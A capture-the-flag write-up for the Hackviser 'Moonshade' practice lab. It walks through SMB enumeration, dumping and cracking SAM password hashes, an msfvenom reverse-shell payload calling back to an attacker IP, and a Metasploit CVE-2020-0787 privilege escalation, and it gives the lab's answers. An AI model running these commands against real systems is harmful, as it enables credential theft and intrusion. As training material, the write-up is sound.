---
title: 'Moonshade'
date: '2026-03-28'
excerpt: 'Practice cracking the password of users on the system, gathering information and performing privilege escalation attacks by exploiting a vulnerable service running.'
prog: 'Hackviser Warmup Stage 3  -  March 2026'
---

<div class="writeup-header">
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_logo.png" alt="Moonshade logo" class="writeup-logo" />
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">Moonshade</h1>
<div class="writeup-date">March 2026 &middot; Warmup Stage 3</div>
</div>
</div>
<p class="lead mb-4">SAM file is a database containing password hash information for user accounts on the system. It is recommended for practicing cracking the password of users on the system, gathering information and performing privilege escalation attacks by exploiting a vulnerable service running.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> What is the date of the registry backup shared with SMB?</p>
<p class="mb-3">Use nmap to scan the target machine and identify open ports with <code>nmap -sC -sV -A [target IP]</code>.</p>
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image1.png" alt="Moonshade Image 1" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image2.png" alt="Moonshade Image 2" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Now that we know the target has port 139 open, we can proceed to attempt shared files listing by using <code>smbclient --no-pass -L [target IP]</code>.</p>
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image3.png" alt="Moonshade Image 3" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> 03-12-2024</p>
<br />

<p class="mb-2"><strong>Question 2:</strong> What is the username of the user having a UID of 1001?</p>
<p class="mb-3">Let's return to list the files and folders that might be interesting by using <code>smbclient --no-pass \\\\[target IP]\\Reg_Backup_03-12-2024</code></p>
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image4.png" alt="Moonshade Image 4" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">We can see that there are files called sam_file and system_file. Download these two files, then run <code>impacket-secretsdump -sam sam_file -system system_file local -outputfile dump_SAM.txt</code>.</p>
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image5.png" alt="Moonshade Image 5" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> edward</p>
<br />

<p class="mb-2"><strong>Question 3:</strong> What is the password of user edward?</p>
<p class="mb-3">The SAM database dump also contains the password hashes for the users. We can use a tool like hashcat to crack the password of user edward. Since the hash we want to crack is NTLM, we set the <code>-m</code> parameter to 1000 and the attack mode to 0 for the <code>-a</code> parameter to try the passwords in rockyou.txt.</p>
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image6.png" alt="Moonshade Image 6" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image7.png" alt="Moonshade Image 7" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> twilight</p>
<br />

<p class="mb-2"><strong>Question 4:</strong> What is the name of the computer?</p>
<p class="mb-3">With the information gathered so far, we can determine the name of the computer by trying to connect to it. We will use Remmina to RDP to the target IP address.</p>
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image8.png" alt="Moonshade Image 8" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">After connecting to the computer, open PowerShell and use <code>$env:COMPUTERNAME</code> to find the name of the computer.</p>
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image9.png" alt="Moonshade Image 9" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> DESKTOP-0SLFDB7</p>
<br />

<p class="mb-2"><strong>Question 5:</strong> What is edward's username at company.hackviser.space?</p>
<p class="mb-3">We can use <code>cmdkey /list</code> to check accounts registered on the computer.</p>
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image10.png" alt="Moonshade Image 10" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">    
<p class="mb-5"><strong>Answer:</strong> edward@company.hv</p>
<br />

<p class="mb-2"><strong>Question 6:</strong> What is the email address that Jacob uses in company.hv?</p>
<p class="mb-3">Considering that we are now in the target environment, we can check the Users folder to find what other users are registered on the computer. We found Jacob's account folder, and opening his Desktop folder to read email_addresses.txt is not allowed. Hence, we need privilege escalation.</p>
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image11.png" alt="Moonshade Image 11" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">We will use Metasploit to escalate privileges. To do this, we will need to generate an exe to with msfvenom to obtian the meterpreter shell. This exe will be running on the target system. To generate the exe file, in the attacker machine's terminal, use <code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[attacker machine IP] lport=[attacker machine listener port] -f exe > meterpreter.exe</code>.</p>
<p class="mb-3">Then we will use <code>python3 -m http.server 8080</code> to serve the exe file.</p>
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image12.png" alt="Moonshade Image 12" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">In the target machine, open <code>http://attacker_IP:8080</code> and download the meterpreter.exe file.</p>
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image13.png" alt="Moonshade Image 13" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Before running the exe file, we need to use <code>msfconsole</code>, <code>use /exploit/multi/handler</code>, <code>set payload windows/x64/meterpreter/reverse_tcp</code>, <code>set lhost [attacker machine IP]</code>, <code>set lport [attacker machine listener port]</code>, and <code>exploit</code> to start the listener. The moment we run the downloaded exe file from the target machine, the meterpreter session will open.</p>
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image14.png" alt="Moonshade Image 14" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">We need to background the current session to continue with other tasks. Run <code>use multi/recon/local_exploit_suggester</code>, <code>set SESSION 1</code> then run it.</p>
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image15.png" alt="Moonshade Image 15" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image16.png" alt="Moonshade Image 16" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">When we run the module, we get many results. Let's perform our authorization escalation attack by selecting the cve_2020_0787_bits_arbitrary_file_move exploit. Run the following commands: <code>use exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move</code>, <code>set SESSION 1</code>, <code>set LHOST [attacker machine IP]</code>, <code>exploit</code>.</p>
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image17.png" alt="Moonshade Image 17" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">After a while, another meterpreter session will open. Use <code>getuid</code> to confirm the user privileges, then use <code>shell</code> to access the command shell. Enter <code>powershell</code>, then navigate to Jacob's desktop folder and read the contents of email_addresses.txt file.</p>
<img src="/assets/hackinglabs/hackviser/warmups/moonshade/moonshade_hackviser_image18.png" alt="Moonshade Image 18" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> jacob.smith@company.hv</p>

<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">March 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>